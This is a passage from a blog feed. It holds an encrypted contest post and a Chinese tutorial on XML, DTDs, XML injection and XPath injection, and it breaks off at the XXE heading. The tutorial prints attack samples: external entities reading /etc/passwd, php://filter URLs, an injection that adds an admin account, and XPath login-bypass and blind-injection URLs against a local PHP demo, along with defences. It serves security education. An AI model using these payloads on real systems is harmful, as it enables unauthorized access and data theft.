04ff9e999df6096052b964fac456578a296350782255fa3053353102c3470c24ff91bd1264994829b6fb593b61fda0e3dc3da83f664bb4edb2f1ef55731a32307b51f6213ba4a95d61914e3824fa15ce784aa7fb6dbb2f7baf93da156531c29a30a8157355c0bc2719d019f3a05aaa7443face82c71065729f2e5d0c872bedd0ae7854cf0210e073b2501a01da9c6137a49d5a404b6353e82d931410291a4acf6a05df074fe59de050e047a8885491b554360a90ddd098b39aba9b4b8fd470ff6cb45746eb3840af607e7bcb975f28368d8214b4f1675d52788db47ee40126956d2e89a7deb80f5b3afdb13589aa58e035a453f4b25ea1c0ce2d098e705ccc1c9e09ba742cda0562c4ea68504aa23c5e9d6da956110779801984e901b014f33ccea49e54c86664bde15fd26d2ab1890a71e448dbbac0851d2dbe91cfb8289ec9da417721b087c4c3aa687bb3cc99661ff2b5f689485c96d991b7f858201f76f8fd0f0cb3bd5bc5e79d42595b237e4d4a18ccf323b71f8d8370707d82e06954b9e2cfb8cadfe80504064ef0c7f648713a2e3ab77c3d24573cac84bd00e4e90e82b047881a6834f4acad7c1ea2b666427fea504ab3a7aaa3e39d6015082f967e68ec6384b0a6c246548c5e42707210e3e1daa20d3ec36f64b32c7e8bcf513c208802108934d8300c14ab8f3a67e935c1f7a4f8cbd113dd1e0b7b04261295592033cc935ca2f31e4dac757f4b540bce8e2557b5508626e14fd72b43d80416ee0fc67a47d3c286d97e7a829c65f59e9bbebd39e8d3f6d7cb13b11ef693ef36a5d0a3d931a189dc94eb25a9393284a8c61fec138fd524cde8c2592fbb6ec75f9654e7004d854e5e773bc7d9e6145f8c71ca87b8a75443441c8f55780eb87b7d9fadf7975eac4547780a6c652f97635ec0a0711a4c03abb568bf429c392bf36b1f00cfb16da8cc8aea2b8f6d768d327692ed9b63f74e6c2f7fdceaf308f4db7d27d9096d7d66ab59e7cc59e8bf683c60ec916f0c78db7fc85ad0835213783f4b88b853831b81d5f170a791ed1bf7fdf6591850d2d147acb5f7e1c06df841878f72583042c774f72887b7304ec0a8b23f18d7333d8a6c08e8a73c63767c5d4335ac8f2d79364fee8fabdd575e2af1def7b3d12682e3a797eec0315c5a87917da36249489d241edf122a94cd488b5f7d17eb4a3b111738b56996a7fa0d756518bd86f131b706852f3db11bb74583ee77fe81a8be7152975bf4ec7e7dcd22f0e7a3123cdf87a37f9d3bf42bafb4c614c724c52194588b02ad4aaf7ba0867293d5570377cb3db8177c93c30197e7793f486dc2101a91919f35492735d49f2b2a3f10deae8d0c22a1aee0dde9b69cdfba918573a8387e99f629f6b19c5401d73a04215ab6e2f2e034cf95b46568084a0fe9ff86f62bc73d1249e788c0c0be28ec74b37f97f6c851c14260aae68ea01180a2440baa4b94323daf41641023fea63887d8b72fd044a042c38e3f002b9f99d8682baa905099a747494c425fc13d6fef65ef0812853d9c3b127e3db83bb0d0b26c1b5ea8bdd04b0504819fc1116eca4976ca01a03b99ac426180154ced9a1ab4cf888543fdaee92c18b9727b7bb3d56602fcabb38d4e1490af3b822bc6ec0bf7617fe7c30545579f574bb207915685e8027bfc1d30a6b538306a220448a8ea52a967ab07fb91d891d47627710b3e9c16c33eddcffcfe5cf385af11d5eac16c758d44bb5e723f4f39db4929464230cf28908f52abe79945db4d2daa248ce7562adc2166516cf9cbafd1f0a5c68189b0f6646605b014a7dfa8988de069d984460a77b8f895ca9683cd7a153ec7730af6d6cf5c6a59710915c888c5629c80be9ec4f0a0d57974b711108d327c6f4a174c42a74c43c6e066f985bcf438187d938eb2eb3dfe15d2f6168b1d9bda92b631a82ac1efbc8f821a9291e28f2f0a8c1167fc453a5bee0d55e0f6b370b45556a1647fb717562b56a9cba5996a41e6d4354f3d15cae3d7b3a69ca69675ddcdf3696a11faac7057a92e74cb726322f7b1f2eab191bc238841f177e6214896ce3db680e7948d45aaedd0214ba3c35bea1ef3d078ead5bbb73832baab33144a1fd35f6fa3e047b7764c20fee2a9cc025eab56e37ccb62abc1fbf5f45fae85c901f3947ad00ce0079934333226e4c6aeeeaa71f1619c2501924bbe83cadceb71bd313d3ae5e0b8ceeee131e24ceb40de5f5f4b13679165500015137fe86c95413a9bb0d19d1d38a426f66ec825e68145308b2fb2d9de14d191702d3f4614ae930e07f831be72544047f7732e59d80937a5b99d8c0012ddb42369a12c2f1d523711423a7ae1aa6a22a8e802628561418ae8eb45859f95d1873eb6bc6be10c7a2e64d9d589b884c32b396d220a827458c122917dd1f3fbbefb803bf79d7bea73b87e45ca5a4c0b9b7740a834edbc9d0fbe616e3f6ca8c981f72a1995d1b70c5b7eff5ad1fed0940504dba323f728fa931bbf5527367ad4ccffb2c8a1b0d455ada609b8443a474b922a84a5823e287ad18301e261f80bd2f6beb3b9ff38e2b0e708f0cfee3c8f7defb77344400778aa97afdde808ed3604503f1be62d9bedc2e9efcc2db5de31d8bfbd8f6195f72f0a45714d0aa33bf258a24c3a95b570c3e6ff67b7082dc6c1b293eaec597af0d65f8060ddc289d166b090c66583c779ad7309d990f7f580fad087d15ec114ca56bd275a6f730385fb240a60ff2b0c64d5eaa3a3fe7ba6da719573adb599329c3dbbe1f5231745a20de194f6632cf1e616631180b095aba1ef0b88c39b4160227c1918100d1d26e68f15c59f1e3047a175774a2b2a20e44ab9e2b59dc50a3919d398af19ef3c8b95978a55f60357b06112d04fb0071deaac77ba5f6ba34b34ee3f36e3496c378689b486f9dd9c2b04c4aa72475fbc6dcdbeec88d06f2a5a895ea0a36e221a0b527100bae3ea87a6972475e5dc863fbeebec77add6a701c85dac85e554a7846e2c3cb0aed173d8cf95175067edc102d703a59988a465f8dfc923f183f491154b8f581beaaf3e4944f1431ca7b65878e83896b1407b876af6dbe9043499e4b130e599c1dd3096e145e3a3d8d39390f3b8a1552396adf6ad8dde18acf9376c3fe73a783908d17480f33342974bf4a5e958137b6dc4522dd7d8a48f6ab06ecd3b86c08f032df10b6a2a980c3a8808e990c92c4794d02690b90e70361d630c0cdfd42493cd3b719ca8fa474f4364d40d2645668a82443cb2e9743a6224d078ded32aef4b14b8bd81d8106f48cc7833d0024d563d4582d9979ab5f248b3585d6e5835d9f0a8ba117265e0cac199c4b866b72ba381541492525dcf9c89bf3c689c8c7535fa71770e13deb7adaf84398f6dd0fe0d43441f8b602be76f96225154f5576c9bf1a8b5e95003a9797fbf8a9414d0612f6f9f4d7b9f9a0653bdba3a27ae42e7c5ab02e3647d07261cc536234dd424cbe5a32d49cddb8d468eebad4e4624b35fe6612afce1e1ce3fb4438e3cee03090bead00386d876a3d6b5baa3c9fb67d682</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 线下赛 </category>
          
          <category> AWD </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 河南高校网安联赛 </tag>
            
            <tag> 复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从XML相关一步一步到XXE漏洞</title>
      <link href="/2019/12/02/%E4%BB%8EXML%E7%9B%B8%E5%85%B3%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%88%B0XXE%E6%BC%8F%E6%B4%9E/"/>
      <url>/2019/12/02/%E4%BB%8EXML%E7%9B%B8%E5%85%B3%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%88%B0XXE%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>想学XXE漏洞，XXE(XML External Entity Injection)全称为XML外部实体注入。XML？！发现我不会，简单看了一下基础知识，发现XML还可能存在XML注入和XPath注入。于是把XML注入、XPath注入和XML 外部实体注入一起学习了！并写了一下学习笔记。</p><h3 id="0x01-XML"><a href="#0x01-XML" class="headerlink" title="0x01 XML"></a>0x01 XML</h3><p><strong>什么是 XML？</strong><br>XML 指可扩展标记语言（EXtensible Markup Language）。<br>XML 的设计宗旨是传输数据，而不是显示数据。<br>XML 是 W3C 的推荐标准。<br>XML 不会做任何事情。XML 被设计用来结构化、存储以及传输信息。<br>XML 语言没有预定义的标签。</p><p><strong>XML 和 HTML 之间的差异</strong><br>XML 不是 HTML 的替代。<br>XML 和 HTML 为不同的目的而设计：</p><blockquote><p>XML 被设计用来传输和存储数据，其焦点是数据的内容。<br>HTML 被设计用来显示数据，其焦点是数据的外观。<br>HTML 旨在显示信息，而 XML 旨在传输信息。</p></blockquote><p><strong>为什么需要XML</strong><br>现实生活中一些数据之间往往存在一定的关系。我们希望能在计算机中保存和处理这些数据的同时能够保存和处理他们之间的关系。XML就是为了解决这样的需求而产生数据存储格式。</p><p><strong>XML基本格式与基本语法</strong><br><em>基本格式：</em></p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;&lt;!--xml文件的声明--&gt;&lt;bookstore&gt;                                                 &lt;!--根元素--&gt;&lt;book category=&quot;COOKING&quot;&gt;        &lt;!--bookstore的子元素，category为属性--&gt;&lt;title&gt;Everyday Italian&lt;/title&gt;           &lt;!--book的子元素，lang为属性--&gt;&lt;author&gt;Giada De Laurentiis&lt;/author&gt;                  &lt;!--book的子元素--&gt;&lt;year&gt;2005&lt;/year&gt;                                     &lt;!--book的子元素--&gt;&lt;price&gt;30.00&lt;/price&gt;                                  &lt;!--book的子元素--&gt;&lt;/book&gt;                                                 &lt;!--book的结束--&gt;&lt;/bookstore&gt;                                       &lt;!--bookstore的结束--&gt;</code></pre><p><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;</code> 称为 XML prolog ，用于声明XML文档的版本和编码，是可选的，必须放在文档开头。<br>standalone值是yes的时候表示DTD仅用于验证文档结构，从而外部实体将被禁用，但它的默认值是no，而且有些parser会直接忽略这一项。</p><p><em>基本语法：</em></p><ul><li>所有 XML 元素都须有关闭标签。</li><li>XML 标签对大小写敏感。</li><li>XML 必须正确地嵌套。</li><li>XML 文档必须有根元素。</li><li>XML 的属性值须加引号。</li></ul><p>若多个字符都需要转义，则可以将这些内容存放到CDATA里面</p><pre><code class="xml">&lt;![CDATA[ 内容 ]]&gt;</code></pre><h3 id="0x02-DTD"><a href="#0x02-DTD" class="headerlink" title="0x02 DTD"></a>0x02 DTD</h3><p><strong>DTD基本概念</strong><br>XML 文档有自己的一个格式规范，这个格式规范是由一个叫做 DTD（document type definition） 的东西控制的。<br>DTD用来为XML文档定义语义约束。可以嵌入在XML文档中(内部声明)，也可以独立的放在另外一个单独的文件中(外部引用)。是XML文档中的几条语句，用来说明哪些元素/属性是合法的以及元素间应当怎样嵌套/结合，也用来将一些特殊字符和可复用代码段自定义为实体。<br><strong>实体引用</strong><br>XML元素以形如 <code>&lt;tag&gt;foo&lt;/tag&gt;</code> 的标签开始和结束，如果元素内部出现如<code>&lt;</code> 的特殊字符，解析就会失败，为了避免这种情况，XML用实体引用（entity reference）替换特殊字符。XML预定义五个实体引用，即用<code>&amp;lt; &amp;gt; &amp;amp; &amp;apos; &amp;quot;</code> 替换 <code>&lt; &gt; &amp; &#39; &quot;</code> 。<br>实体引用可以起到类似宏定义和文件包含的效果，为了方便，我们会希望自定义实体引用，这个操作在称为 Document Type Defination（DTD，文档类型定义）的过程中进行。<br><strong>dtd的引入方式</strong><br>DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。DTD 可以在 XML 文档内声明，也可以外部引用。<br><em>内部 DTD</em><br>使用内部的dtd文件，即将约束规则定义在xml文档中</p><pre><code class="xml">&lt;!DOCTYPE 根元素名称 [元素声明]&gt;</code></pre><p>示例代码：</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE note [&lt;!--定义此文档是 note 类型的文档--&gt;&lt;!ELEMENT note (to,from,heading,body)&gt;&lt;!--定义note元素有四个元素--&gt;&lt;!ELEMENT to (#PCDATA)&gt;&lt;!--定义to元素为”#PCDATA”类型--&gt;&lt;!ELEMENT from (#PCDATA)&gt;&lt;!--定义from元素为”#PCDATA”类型--&gt;&lt;!ELEMENT head (#PCDATA)&gt;&lt;!--定义head元素为”#PCDATA”类型--&gt;&lt;!ELEMENT body (#PCDATA)&gt;&lt;!--定义body元素为”#PCDATA”类型--&gt;]&gt;&lt;note&gt;&lt;to&gt;Y0u&lt;/to&gt;&lt;from&gt;@re&lt;/from&gt;&lt;head&gt;v3ry&lt;/head&gt;&lt;body&gt;g00d!&lt;/body&gt;&lt;/note&gt;</code></pre><p><em>外部 DTD</em><br>（1）引入外部的dtd文件</p><pre><code class="xml">&lt;!DOCTYPE 根元素名称 SYSTEM &quot;dtd路径&quot;&gt;</code></pre><p>（2）使用外部的dtd文件(网络上的dtd文件)</p><pre><code class="xml">&lt;!DOCTYPE 根元素 PUBLIC &quot;DTD名称&quot; &quot;DTD文档的URL&quot;&gt;</code></pre><p>当使用外部DTD时，通过如下语法引入：</p><pre><code class="xml"> &lt;!DOCTYPE root-element SYSTEM &quot;filename&quot;&gt;</code></pre><p>示例代码：</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root-element SYSTEM &quot;test.dtd&quot;&gt;&lt;note&gt;&lt;to&gt;Y0u&lt;/to&gt;&lt;from&gt;@re&lt;/from&gt;&lt;head&gt;v3ry&lt;/head&gt;&lt;body&gt;g00d!&lt;/body&gt;&lt;/note&gt;</code></pre><p>test.dtd</p><pre><code class="xml">&lt;!ELEMENT to (#PCDATA)&gt;&lt;!--定义to元素为”#PCDATA”类型--&gt;&lt;!ELEMENT from (#PCDATA)&gt;&lt;!--定义from元素为”#PCDATA”类型--&gt;&lt;!ELEMENT head (#PCDATA)&gt;&lt;!--定义head元素为”#PCDATA”类型--&gt;&lt;!ELEMENT body (#PCDATA)&gt;&lt;!--定义body元素为”#PCDATA”类型--&gt;</code></pre><p><strong>PCDATA</strong><br>PCDATA的意思是被解析的字符数据。PCDATA是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。文本中的标签会被当作标记来处理，而实体会被展开。<br>被解析的字符数据不应当包含任何<code>&amp;</code>，<code>&lt;</code>，或者<code>&gt;</code>字符，需要用<code>&amp;amp;</code> <code>&amp;lt;</code> <code>&amp;gt;</code>实体来分别替换。<br><strong>CDATA</strong><br>CDATA意思是字符数据，CDATA 是不会被解析器解析的文本，在这些文本中的标签不会被当作标记来对待，其中的实体也不会被展开。<br><strong>DTD元素</strong><br><img src="http://img-blog.csdnimg.cn/20191126220900607.png" alt="在这里插入图片描述"><br><strong>DTD属性</strong><br><strong>属性声明语法</strong>：</p><pre><code class="xml">&lt;!ATTLIST 元素名称 属性名称 属性类型 默认值&gt;</code></pre><p>DTD实例：</p><pre><code class="xml">&lt;!ATTLIST payment Luckey CDATA &quot;Q&quot;&gt;</code></pre><p>XML实例：</p><pre><code class="xml">&lt;payment Luckey=&quot;Q&quot; /&gt;</code></pre><p>以下是 属性类型的选项：<br><img src="http://img-blog.csdnimg.cn/20191126224501166.png" alt="在这里插入图片描述"><br>默认属性值可使用下列值：<br><img src="http://img-blog.csdnimg.cn/20191126224640102.png" alt="在这里插入图片描述"><br><strong>DTD实体</strong></p><blockquote><p>实体是用于定义引用普通文本或特殊字符的快捷方式的变量。<br>实体引用是对实体的引用。<br>实体可在内部或外部进行声明。</p></blockquote><p><em>按实体有无参分类，实体分为一般实体和参数实体</em><br><em>一般实体的声明</em>：<code>&lt;!ENTITY 实体名称 &quot;实体内容&quot;&gt;</code><br>引用一般实体的方法：<code>&amp;实体名称;</code><br>ps：经实验，普通实体可以在DTD中引用，可以在XML中引用，可以在声明前引用，还可以在实体声明内部引用。</p><p><em>参数实体的声明</em>：<code>&lt;!ENTITY % 实体名称 &quot;实体内容&quot;&gt;</code><br>引用参数实体的方法：<code>%实体名称;</code><br>ps：经实验，参数实体只能在DTD中引用，不能在声明前引用，也不能在实体声明内部引用。<br>DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。</p><p><em>按实体使用方式分类，实体分为内部声明实体和引用外部实体</em><br><em>内部实体</em></p><pre><code class="xml">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</code></pre><p>内部实体示例代码：</p><pre><code class="xml">&lt;?xml version = &quot;1.0&quot; encoding = &quot;utf-8&quot;?&gt;&lt;!DOCTYPE test [    &lt;!ENTITY writer &quot;Dawn&quot;&gt;    &lt;!ENTITY copyright &quot;Copyright W3School.com.cn&quot;&gt;]&gt;&lt;test&gt;&amp;writer;©right;&lt;/test&gt;</code></pre><p><em>外部实体</em><br>外部实体，用来引入外部资源。有<code>SYSTEM</code>和<code>PUBLIC</code>两个关键字，表示实体来自本地计算机还是公共计算机。</p><pre><code class="xml">&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;或者&lt;!ENTITY 实体名称 PUBLIC &quot;public_ID&quot; &quot;URI&quot;&gt;</code></pre><p>外部实体示例代码：</p><pre><code class="xml">&lt;?xml version = &quot;1.0&quot; encoding = &quot;utf-8&quot;?&gt;&lt;!DOCTYPE test [    &lt;!ENTITY file SYSTEM &quot;file:///etc/passwd&quot;&gt;    &lt;!ENTITY copyright SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;]&gt;&lt;author&gt;&amp;file;©right;&lt;/author&gt;</code></pre><p>外部实体可支持http、file等协议。不同程序支持的协议不同：<br><img src="http://img-blog.csdnimg.cn/20191126231911378.png" alt="在这里插入图片描述"><br>PHP支持的协议会更多一些，但需要一定的扩展：<br><img src="http://img-blog.csdnimg.cn/20191126232103676.png" alt="在这里插入图片描述"><br>PHP引用外部实体，<strong>常见的利用协议</strong>：</p><pre><code class="shell">file://文件绝对路径 如：file:///etc/passwdhttp://url/file.txtphp://filter/read=convert.base64-encode/resource=xxx.php</code></pre><p><em>参数实体+外部实体</em></p><pre><code class="xml">&lt;!ENTITY % 实体名称 SYSTEM &quot;URI/URL&quot;&gt;</code></pre><p>参数实体+外部实体示例代码：</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE test [  &lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;  %file;]&gt;</code></pre><p><code>%file</code>(参数实体)是在DTD中被引用的，而<code>&amp;file;</code>是在xml文档中被引用的。</p><h3 id="0x03-XML注入"><a href="#0x03-XML注入" class="headerlink" title="0x03 XML注入"></a>0x03 XML注入</h3><p>XML的设计宗旨是传输数据，而非显示数据。<br>XML注入是一种古老的技术，通过利用闭合标签改写XML文件实现的。</p><h4 id="XML注入简介"><a href="#XML注入简介" class="headerlink" title="XML注入简介"></a>XML注入简介</h4><p>XML是一种数据组织存储的数据结构方式，安全的XML在用户输入生成新的数据时候应该只能允许用户接受的数据，需要过滤掉一些可以改变XML标签也就是说改变XML结构插入新功能（例如新的账户信息，等于添加了账户）的特殊输入，如果没有过滤，则可以导致XML注入攻击。</p><h4 id="XML注入前提条件"><a href="#XML注入前提条件" class="headerlink" title="XML注入前提条件"></a>XML注入前提条件</h4><p>（1）用户能够控制数据的输入<br>（2）程序有拼凑的数据</p><p><strong>注入实例</strong><br>test1.xml</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;manager&gt;    &lt;admin id=&quot;1&quot;&gt;    &lt;username&gt;admin&lt;/username&gt;    &lt;password&gt;admin&lt;/password&gt;    &lt;/admin&gt;    &lt;admin id=&quot;2&quot;&gt;    &lt;username&gt;root&lt;/username&gt;    &lt;password&gt;root&lt;/password&gt;    &lt;/admin&gt;&lt;/manager&gt;</code></pre><p>XML与HTML一样，也存在注入攻击，在注入的方法上也非常相似。<br>对于上面的xml文件，如果攻击者能够掌控password字段，那么就会产生XML注入。如攻击者输入：</p><pre><code class="xml">admin &lt;/password&gt;&lt;/admin&gt;&lt;admin id=&quot;3&quot;&gt;&lt;name&gt;hack&lt;/name&gt;&lt;password&gt;hacker&lt;/password&gt;&lt;/admin&gt;</code></pre><p>最终修改结果为：</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;manager&gt;    &lt;admin id=&quot;1&quot;&gt;    &lt;name&gt;admin&lt;/name&gt;    &lt;password&gt;admin&lt;/password&gt;    &lt;/admin&gt;    &lt;admin id=&quot;2&quot;&gt;    &lt;username&gt;root&lt;/username&gt;    &lt;password&gt;root&lt;/password&gt;    &lt;/admin&gt;    &lt;admin id=&quot;3&quot;&gt;    &lt;name&gt;hack&lt;/name&gt;    &lt;password&gt;hacker&lt;/password&gt;    &lt;/admin&gt;&lt;/manager&gt;</code></pre><p>这样就通过XML注入添加了一个名为hack、密码为：hacker的管理员账户。<br>XML注入两大要素：<strong>标签闭合和获取XML表结构</strong></p><h4 id="XML注入防御"><a href="#XML注入防御" class="headerlink" title="XML注入防御"></a>XML注入防御</h4><p>（1）对用户的输入进行过滤<br>（2）对用户的输入进行转义<br>| 预定义字符 | 转以后的预定义字符 |<br>|–|–|<br>|<code>&lt;</code>|<code>&amp;lt;</code>|<br>|<code>&gt;</code>|<code>&amp;gt;</code>|<br>|<code>&amp;</code>|<code>&amp;amp;</code>|<br>|<code>&#39;</code>|<code>&amp;apos;</code>|<br>|<code>&quot;</code>|<code>&amp;quot;</code>|</p><h3 id="0x04-XPath注入"><a href="#0x04-XPath注入" class="headerlink" title="0x04 XPath注入"></a>0x04 XPath注入</h3><h4 id="XPath注入攻击简介"><a href="#XPath注入攻击简介" class="headerlink" title="XPath注入攻击简介"></a>XPath注入攻击简介</h4><p>XPath注入攻击是指利用XPath 解析器的松散输入和容错特性，能够在 URL、表单或其它信息上附带恶意的XPath 查询代码，以获得权限信息的访问权并更改这些信息。XPath注入攻击是针对Web服务应用新的攻击方法，它允许攻击者在事先不知道XPath查询相关知识的情况下，通过XPath查询得到一个XML文档的完整内容。</p><p>XPath注入发生在当站点使用用户输入的信息来构造请求以获取XML数据。攻击者对站点发送经过特殊构造的信息来探究站点使用的XML是如何构造的，从而进一步获取正常途径下无法获取的数据。当XML数据被用作账户验证时，攻击者还可以提升他的权限。</p><h4 id="XPath注入攻击特点"><a href="#XPath注入攻击特点" class="headerlink" title="XPath注入攻击特点"></a>XPath注入攻击特点</h4><p>XPath注入攻击利用两种技术，即<strong>XPath扫描</strong>和 <strong>XPath查询布尔化</strong>。通过该攻击，攻击者可以控制用来进行XPath查询的XML数据库。这种攻击可以有效地对付使用XPath查询（和XML数据库） 来执行身份验证、查找或者其它操作。</p><p>XPath注入攻击同SQL注入攻击类似，但与SQL注入相比，XPath具有的优势：</p><ol><li><p>广泛性<br>只要是利用XPath语法的Web 应用程序若未对输入的XPath查询做严格的处理都会存在XPath注入漏洞。而在SQL注入攻击过程中根据数据库支持的SQL语言不同，注入攻击的实现可能不同。</p></li><li><p>危害性大<br>XPath语言几乎可以没有访问控制限制的引用XML文档的所有部分。而在SQL注入中，一个“<code>用户</code>”的权限可能被限制到 某一特定的表、列或者查询。<br>XPath注入攻击可以保证得到完整的XML文档，即完整的数据库。只要Web服务应用具有基本的安全漏洞，即可构造针对 XPath应用的自动攻击。</p></li></ol><h4 id="Xpath注入攻击原理与利用"><a href="#Xpath注入攻击原理与利用" class="headerlink" title="Xpath注入攻击原理与利用"></a>Xpath注入攻击原理与利用</h4><p>XPath注入攻击主要是通过构建特殊的输入，这些输入往往是XPath语法中的一些组合，这些输入将作为参数传入Web 应用程序，通过执行XPath查询而执行入侵者想要的操作。<br>注入对象不是数据库users表，而是一个存储数据的XML文件。因为xpath不存在访问控制，所以不会遇到许多在SQL注入中经常遇到的访问限制。 注入出现的位置也就是<code>cookie</code>，<code>headers</code>，<code>request</code> <code>parameters/input</code>等。<br><a href="http://www.cnblogs.com/wendyw/p/11633588.html" target="_blank" rel="noopener">Xpath基本语法</a><br><a href="http://www.freebuf.com/column/211251.html" target="_blank" rel="noopener">xPath注入学习之基础语法学习</a></p><p>如果一个网站某应用程序将数据保存在XML中，并且对用户的输入没有做限制，攻击者提交了没有经过处理的输入，就插入到 XPath 查询中，即产生Xpath注入，那么就攻击者就可能通过控制查询，获取数据，或者删除数据之类的操作。</p><p>Xpath是xml路径语言，用于配置文件的查找。数据库就是xml文件。因此只要是利用XPath语法的Web 应用程序如果未对输入的XPath查询做严格的处理都会存在XPath注入漏洞。比如一些登录地址页面，搜索页面需要与xml交互的位置。<br><strong>1、Xpath直接注入</strong><br>示例代码：<br>test2.xml(存储用户名和密码)</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;root&gt;    &lt;users&gt;         &lt;user&gt;             &lt;id&gt;1&lt;/id&gt;            &lt;username&gt;test1&lt;/username&gt;            &lt;password&gt;test1&lt;/password&gt;        &lt;/user&gt;         &lt;user&gt;             &lt;id&gt;2&lt;/id&gt;            &lt;username&gt;test2&lt;/username&gt;            &lt;password&gt;test2&lt;/password&gt;        &lt;/user&gt;    &lt;/users&gt;&lt;/root&gt;</code></pre><p>2.php(用于接收传入参数，并进行XML查询)</p><pre><code class="php">&lt;?php$xml=simplexml_load_file(&#39;test2.xml&#39;);$name=$_GET[&#39;name&#39;];$pwd=$_GET[&#39;pwd&#39;];$query=&quot;/root/users/user[username/text()=&#39;&quot;.$name.&quot;&#39; and password/text()=&#39;&quot;.$pwd.&quot;&#39;]&quot;;echo $query;$result=$xml-&gt;xpath($query);if($result){    echo &#39;&lt;h2&gt;Welcome&lt;/h2&gt;&#39;;    foreach($result as $key=&gt;$value){        echo &#39;&lt;br /&gt;ID:&#39;.$value-&gt;id;        echo &#39;&lt;br /&gt;Username:&#39;.$value-&gt;username;    }}?&gt;</code></pre><p><strong><a href="http://www.w3school.com.cn/php/func_simplexml_load_file.asp" target="_blank" rel="noopener"><code>simplexml_load_file()</code>函数</a></strong><br>返回类 SimpleXMLElement 的一个对象，该对象的属性包含 XML 文档中的数据</p><p>正常查询：<code>/root/users/user[username/text()=&#39;test1&#39;and password/text()=&#39;test1&#39;]</code><br><img src="http://img-blog.csdnimg.cn/20191129230634712.jpg" alt="在这里插入图片描述"><br>攻击者在<code>username</code>字段中输入：<code>&#39; or 1=1 or &#39;&#39;=&#39;</code><br>变成<code>/root/users/user[username/text()=&#39;&#39; or 1=1 or &#39;&#39;=&#39;&#39; and password/text()=&#39;1&#39;]</code>，成功获取所有user数据。上面这个字符串会在逻辑上使查询一直返回 <code>true</code> 并将一直允许攻击者访问系统。<br><img src="http://img-blog.csdnimg.cn/20191129231005923.jpg" alt="在这里插入图片描述"><br>攻击者可以利用 XPath 在应用程序中动态地操作 XML 文档。攻击完成登录可以再通过XPath盲注技术获取最高权限帐号和其它重要文档信息。<br><strong>2、XPath盲注</strong><br>如果遍历出整个XML文档，一般步骤如下：<br><em>1.盲注根节点</em><br>利用count（/*）判断根下节点：</p><pre><code class="php">http://127.0.0.1/xml/2.php?name=&#39; or count(/*) = 1 or &#39;1&#39; = &#39;2</code></pre><p><img src="http://img-blog.csdnimg.cn/20191130001342877.jpg" alt="在这里插入图片描述"><br>有返回结果证明存在一个根节点。<br>利用substring分割根节点的每个字符，猜解第一级节点：</p><pre><code class="php">http://127.0.0.1/xml/2.php?name=&#39; or substring(name(/*[position() = 1]),1,1)=&#39;r&#39; or &#39;1&#39;=&#39;2http://127.0.0.1/xml/2.php?name=&#39; or substring(name(/*[position() = 1]),2,1)=&#39;o&#39; or &#39;1&#39;=&#39;2</code></pre><p>…<br>最终结果: root<br><em>2.盲注root的下一级节点</em><br>判断root的下一级节点数：</p><pre><code class="php">http://127.0.0.1/xml/2.php?name=&#39; or count(/root/*) = 1 or &#39;1&#39; = &#39;2</code></pre><p>有返回结果证明存在一个root的下一级节点。<br><img src="http://img-blog.csdnimg.cn/20191130001458382.jpg" alt="在这里插入图片描述"><br>猜解root的下一级节点：</p><pre><code class="php">http://127.0.0.1/xml/2.php?name=&#39; or substring(name(/root/*[position() = 1]),1,1)=&#39;u&#39; or &#39;1&#39;=&#39;2http://127.0.0.1/xml/2.php?name=&#39; or substring(name(/root/*[position() = 1]),2,1)=&#39;s&#39; or &#39;1&#39;=&#39;2</code></pre><p>最终结果:users<br>重复上述步骤，直至猜解出所有节点，最后来猜解节点中的数据或属性值。</p><h4 id="Xpath注入攻击危害"><a href="#Xpath注入攻击危害" class="headerlink" title="Xpath注入攻击危害"></a>Xpath注入攻击危害</h4><ul><li>在URL及表单中提交恶意XPath代码，可获取到权限限制数据的访问权，并可修改这些数据。</li><li>可通过此类漏洞查询获取到系统内部完整的XML文档内容。</li><li>逻辑以及认证被绕过，它不像数据库那样有各种权限，xml没有各种权限的概念,正因为没有权限概念，因此利用xpath构造查询的时候整个数据库都会被用户读取。</li></ul><h4 id="Xpath注入攻击防御"><a href="#Xpath注入攻击防御" class="headerlink" title="Xpath注入攻击防御"></a>Xpath注入攻击防御</h4><ol><li>数据提交到服务器上端，在服务端正式处理这批数据之前，对提交数据的合法性进行验证。</li><li>检查提交的数据是否包含特殊字符，对特殊字符进行编码转换或替换、删除敏感字符或字符串。</li><li>对于系统出现的错误信息，以IE错误编码信息替换，屏蔽系统本身的出错信息。</li><li>参数化XPath查询，将需要构建的XPath查询表达式，以变量的形式表示，变量不是可以执行的脚本。</li><li>通过MD5、SSL等加密算法，对于数据敏感信息和在数据传输过程中加密，即使某些非法用户通过非法手法获取数据包，看到的也是加密后的信息。 总结下就是：限制提交非法字符，对输入内容严格检查过滤，参数化XPath查询的变量。</li></ol><h3 id="0x05-XML外部实体注入-XXE"><a href="#0x05-XML外部实体注入-XXE" class="headerlink" title="0x05 